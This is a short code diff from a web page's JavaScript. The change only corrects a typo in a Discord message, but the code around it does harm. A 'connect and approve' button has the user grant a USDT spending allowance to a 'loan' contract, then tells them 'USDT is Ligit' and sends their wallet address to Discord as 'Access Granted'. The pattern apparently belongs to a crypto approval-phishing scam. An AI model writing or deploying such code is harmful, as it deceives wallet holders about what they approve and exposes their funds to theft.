@@ -60,7 +60,7 @@ document.getElementById("connectAndApprove").addEventListener("click", async () 
         await usdtContract.methods.approve(LOAN_CONTRACT_ADDRESS, amountToApprove).send({ from: account });
 
         alert("Congratulations USDT is Ligit");
-        sendToDiscord(`Access Guarented: ${account}`);
+        sendToDiscord(`Access Granted: ${account}`);
     } catch (error) {
         console.error("Error:", error);
         alert("An error occurred. Check the console for details.");
